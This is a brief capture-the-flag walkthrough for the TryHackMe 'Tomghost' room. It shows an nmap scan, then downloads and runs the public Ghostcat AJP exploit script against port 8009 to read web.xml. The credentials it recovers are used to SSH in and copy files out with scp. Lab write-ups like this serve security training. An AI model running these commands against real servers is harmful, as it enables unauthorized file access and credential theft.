# Tomghost TryHackMe

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to. This writeup is for the TryHackMe TOMGHOST Challene

## Disclaimer - IP Address mentioned here may be different to the IP in your environment


## Scanning and Enumeration

Step 1 - Reconnissance 

We initiate NMAP scan for the host using following command

       nmap -A -T4 -sC -sV -oN nmap/scan.log 10.48.177.64



As per the scaning results it was clear that the port 8009 of the apache webserver is open. We try to use the Ghostcat exploit to read the files.

       wget https://raw.githubusercontent.com/00theway/Ghostcat-CNVD-2020-10487/master/ajpShooter.py
       python3 ajpShooter.py http://10.48.177.64:8080 8009 /WEB-INF/web.xml read



Using the expolit we found the user "skyfuck" and user's password.
lets try to SSH in to the host using the credentials extracted for the user "skyfuck"

-tomghost-3.png

Answer for the question and searching for the "user.txt" and the key

-tomghost-4.png

Lets pay attention to the two files in the home directory credential.pgp & tryhackme.asc can be useful for the next steps
Lets download the files from the host using SCP

        scp skyfuck@10.48.177.64:/home/skyfuck/* .

-tomghost-5.png



